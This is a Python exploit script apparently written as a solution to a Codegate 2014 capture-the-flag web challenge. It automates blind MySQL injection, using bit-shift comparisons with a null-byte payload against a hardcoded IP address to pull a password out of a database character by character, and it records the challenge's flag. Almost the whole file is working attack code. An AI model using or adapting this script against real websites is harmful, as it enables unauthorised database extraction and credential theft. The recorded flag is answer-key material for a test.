#!/usr/bin/env python

# blindeye.py
# fast blind MySQLi using bit shifts (exactly 8 requests per char instead of 127 per char)
# by jiva

# web500 - 120 - Codegate Quals 2014
# Written after CTF ended using %00 eregi bug and the IP trick
# Make sure to run this script from different IP

# Congrats! the key is DontHeartMeBaby*$#@!

import sys
import requests

# perform injection for a given shift amount and check if token is in page source
# _vector: entry point for the sql injection
# _token: a word or phrase which appears in the source code of the page for a successful query
# _q1: the first part of the query (ex: "' or")
# _q2: the subquery to get results for (ex: select group_concat(table_name) from information_schema.tables)
# _pos: character position to bruteforce
# _shift: number of bits to shift the character at position _pos
# _ded: deduced ordinal value of the character shifted _shift bits (used for comparison)
def blindeye(_vector, _token, _q1, _q2, _pos, _shift, _ded):
	sqli = str(_q1)+ " (ascii((substr((" +str(_q2)+ ")," +str(_pos)+ ",1)))>>" +str(_shift)+ ")=" +str(_ded)+ " or '1'='1 -- -"
	if _token in requests.post(_vector, data={'password': sqli}).text:
		return True
	else:
		return False

# main
def main():
	# start and end lengths of result to brute force
	res_start_len = 0
	res_end_len = 1000
	
	# vector
	vector = 'http://58.229.183.24/5a520b6b783866fd93f9dcdaf753af08/index.php'
	token = 'True'
	
	# query
	q1 = "\x00' or"
	# q2 = 'user()'
	q2 = 'select password from rms_120_pw where ip = "x.x.x.x"' # Run from different IP than x.x.x.x

	for pos in xrange(res_start_len,res_end_len):
		bitstr = ''
		for shift in xrange(7,-1,-1):
			ded0 = int(bitstr+'0', 2)
			ded1 = int(bitstr+'1', 2)
			if blindeye(vector, token, q1, q2, pos, shift, ded0): bitstr += '0'
			else: bitstr += '1'
		sys.stdout.write(chr(int(bitstr,2)))
		sys.stdout.flush()
	print

# boilerplate
if __name__ == '__main__':
	main()

